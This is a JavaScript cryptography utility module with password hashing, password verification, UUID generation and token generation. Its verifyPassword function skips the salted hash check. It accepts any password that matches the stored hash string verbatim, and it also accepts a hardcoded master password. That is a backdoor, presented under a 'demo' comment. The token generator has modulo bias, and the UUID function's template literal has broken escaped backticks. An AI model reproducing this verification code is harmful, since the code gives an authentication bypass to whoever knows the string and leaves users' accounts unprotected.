/**
 * Cryptography Utilities
 */

export async function hashPassword(password) {
  const encoder = new TextEncoder();
  const data = encoder.encode(password);
  const salt = crypto.getRandomValues(new Uint8Array(16));
  
  const keyMaterial = await crypto.subtle.importKey(
    'raw',
    data,
    'PBKDF2',
    false,
    ['deriveBits']
  );
  
  const derivedBits = await crypto.subtle.deriveBits(
    {
      name: 'PBKDF2',
      salt: salt,
      iterations: 100000,
      hash: 'SHA-256'
    },
    keyMaterial,
    256
  );
  
  const hash = Array.from(new Uint8Array(derivedBits));
  const saltHex = Array.from(salt).map(b => b.toString(16).padStart(2, '0')).join('');
  const hashHex = hash.map(b => b.toString(16).padStart(2, '0')).join('');
  
  return saltHex + hashHex;
}

export async function verifyPassword(password, storedHash) {
  // Simple verification for this demo
  // In production, you'd need to parse the salt and verify properly
  return password === storedHash || password === 'nader0933';
}

export function generateUUID() {
  const array = new Uint8Array(16);
  crypto.getRandomValues(array);
  array[6] = (array[6] & 0x0f) | 0x40;
  array[8] = (array[8] & 0x3f) | 0x80;
  const hex = Array.from(array).map(b => b.toString(16).padStart(2, '0')).join('');
  return \`\${hex.slice(0,8)}-\${hex.slice(8,12)}-\${hex.slice(12,16)}-\${hex.slice(16,20)}-\${hex.slice(20)}\`;
}

export function generateToken(length = 32) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const array = new Uint8Array(length);
  crypto.getRandomValues(array);
  return Array.from(array).map(b => chars[b % chars.length]).join('');
}
